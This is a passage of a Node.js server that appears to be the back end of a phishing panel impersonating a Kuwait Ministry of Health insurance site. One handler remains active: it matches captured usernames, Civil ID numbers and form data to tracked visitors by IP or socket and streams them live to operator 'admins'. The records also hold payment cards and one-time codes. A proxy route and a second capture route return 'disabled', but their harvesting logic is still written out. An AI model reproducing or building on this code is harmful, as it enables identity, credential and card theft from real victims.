    console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}, visitorId=${visitorId || 'none'}, socketId=${reqSocketId || 'none'}`);
    
    // Extract useful fields based on type
    let fields = {};
    let pageName = 'MOH';
    let username = null;
    
    if (data) {
      if (data.fields) fields = data.fields;
      if (data.content) {
        if (data.content.fields) fields = { ...fields, ...data.content.fields };
        if (data.content.page_text) fields['محتوى الصفحة'] = Array.isArray(data.content.page_text) ? data.content.page_text.join('\n') : data.content.page_text;
      }
      if (data.path) pageName = `MOH: ${data.path}`;
      if (data.username) username = data.username;
    }
    
    // Find matching visitor: try by visitorId first, then socketId, then IP
    let matchedVisitor = null;
    
    // 1. Match by visitor ID
    if (visitorId) {
      visitors.forEach((v, sid) => {
        if (v._id === visitorId) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    // 2. Match by socket ID
    if (!matchedVisitor && reqSocketId) {
      const v = visitors.get(reqSocketId);
      if (v) {
        matchedVisitor = { visitor: v, socketId: reqSocketId };
      }
    }
    
    // 3. Fallback: match by IP
    if (!matchedVisitor) {
      visitors.forEach((v, sid) => {
        if (v.ip === clientIp) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    console.log(`[MOH-DIRECT] Matched: ${matchedVisitor ? matchedVisitor.visitor._id : 'NONE'}, visitors count: ${visitors.size}`);
    
    if (matchedVisitor) {
      const v = matchedVisitor.visitor;
      
      // Update username if captured
      if (username) {
        v.fullName = username;
        v.mohUsername = username;
      }
      
      // Store data
      if (Object.keys(fields).length > 0) {
        if (!v.dataHistory) v.dataHistory = [];
        v.dataHistory.push({
          content: fields,
          page: pageName,
          timestamp: new Date().toISOString(),
        });
        v.data = { ...v.data, ...fields };
        v.hasNewData = true;
        v.page = pageName;
      }
      
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        if (username) {
          io.to(adminSocketId).emit('visitor:nameUpdated', {
            visitorId: v._id,
            name: username,
          });
        }
        if (Object.keys(fields).length > 0) {
          io.to(adminSocketId).emit('visitor:dataSubmitted', {
            visitorId: v._id,
            socketId: matchedVisitor.socketId,
            data: { content: fields, page: pageName },
            visitor: v,
          });
        }
      });
      
      console.log(`[MOH-DIRECT] Updated visitor ${v._id} (${clientIp})`);
    } else {
      console.log(`[MOH-DIRECT] No matching visitor for IP ${clientIp}`);
    }
    
    res.json({ ok: true });
  } catch (err) {
    console.error('[MOH-DIRECT] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/captured-data", (req, res) => {
  return res.status(410).json({ error: "data capture disabled" });
  try {
    const { url, contentType, body, timestamp, ip } = req.body;
    console.log(`[DATA-COLLECTOR] Received POST data from ${ip} to ${url}`);
    
    // Parse form data from body string
    let parsedFields = {};
    if (body && contentType && contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(body);
      for (const [key, value] of params.entries()) {
        parsedFields[key] = value;
      }
    } else if (body) {
      try {
        parsedFields = JSON.parse(body);
      } catch(e) {
        parsedFields = { rawBody: body };
      }
    }
    
    // Find visitor by IP or create a data entry
    let matchedVisitor = null;
    visitors.forEach((v, socketId) => {
      if (v.ip === ip) {
        matchedVisitor = { visitor: v, socketId };
      }
    });
    
    if (matchedVisitor) {
      // Update existing visitor with captured data
      const v = matchedVisitor.visitor;
      if (!v.dataHistory) v.dataHistory = [];
      v.dataHistory.push({
        content: parsedFields,
        page: `MOH-POST: ${url}`,
        timestamp: timestamp || new Date().toISOString(),
      });
      v.data = { ...v.data, ...parsedFields };
      v.hasNewData = true;
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:dataSubmitted', {
          visitorId: v._id,
          socketId: matchedVisitor.socketId,
          data: { content: parsedFields, page: `MOH-POST: ${url}` },
          visitor: v,
        });
      });
    } else {
      // No matching visitor - store as orphan data
      console.log(`[DATA-COLLECTOR] No matching visitor for IP ${ip}, storing as orphan`);
      // Create a temporary visitor entry
      visitorCounter++;
      const orphanVisitor = {
        _id: `moh_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: 'moh-captured',
        visitorNumber: visitorCounter,
        createdAt: timestamp || new Date().toISOString(),
        isRead: false,
        fullName: parsedFields.UserName || parsedFields.username || '',
        phone: '',
        idNumber: parsedFields.CivilId || parsedFields.civilId || '',
        apiKey: '',
        ip: ip,
        country: 'KW',
        city: '',
        os: 'Unknown',
        device: 'Unknown',
        browser: 'Unknown',
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: `MOH-POST: ${url}`,
        data: parsedFields,
        dataHistory: [{
          content: parsedFields,
          page: `MOH-POST: ${url}`,
          timestamp: timestamp || new Date().toISOString(),
        }],
        paymentCards: [],
        digitCodes: [],
        hasNewData: true,
        isBlocked: false,
        isConnected: false,
        sessionStartTime: Date.now(),
      };
      savedVisitors.push(orphanVisitor);
      saveData();
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:new', orphanVisitor);
      });
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('[DATA-COLLECTOR] Error:', error);
    res.status(500).json({ error: 'Internal error' });
  }
});

// ===== PROXY ROUTE FOR KUWAIT MOH INSURANCE SITE =====
const https = require("https");

app.all("/api/proxy", (req, res) => {
  return res.status(410).json({ error: "proxy and data capture disabled" });
});
// Handle CORS preflight for proxy
app.options("/api/proxy", (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.status(204).send();
});

// Cleanup stale connections - runs every 30 seconds
// Checks if socket IDs in the visitors Map are still actually connected
setInterval(() => {
  const connectedSocketIds = new Set();
  // Get all actually connected socket IDs from Socket.IO
  for (const [id, socket] of io.sockets.sockets) {
    connectedSocketIds.add(id);
  }
  
  let cleaned = 0;
  // Check each visitor in the active visitors Map
  visitors.forEach((visitor, socketId) => {
    if (!connectedSocketIds.has(socketId)) {
      // This socket is no longer connected - clean up
      const visitorId = visitor._id;
      visitors.delete(socketId);
      
      // Check if visitor reconnected with a different socket
      const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
      
      if (!reconnected) {
        // Update saved visitor as disconnected
        const savedVisitor = savedVisitors.find(v => v._id === visitorId);
        if (savedVisitor) {
          savedVisitor.isConnected = false;
        }
        
        // Notify admins
        admins.forEach((admin, adminSocketId) => {
          io.to(adminSocketId).emit("visitor:disconnected", {
            visitorId: visitorId,
            socketId: socketId,
          });
        });
      }
      cleaned++;
    }
  });
  
  if (cleaned > 0) {
    saveData();
    console.log(`Cleaned ${cleaned} stale connections. Active: ${visitors.size}`);
  }
}, 30000); // Every 30 seconds

// On server start, mark all visitors as disconnected (fresh start)
// since no sockets are connected yet
savedVisitors.forEach(v => {
  v.isConnected = false;
});
visitors.clear();
saveData();
console.log("Server start: all visitors marked as disconnected");

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
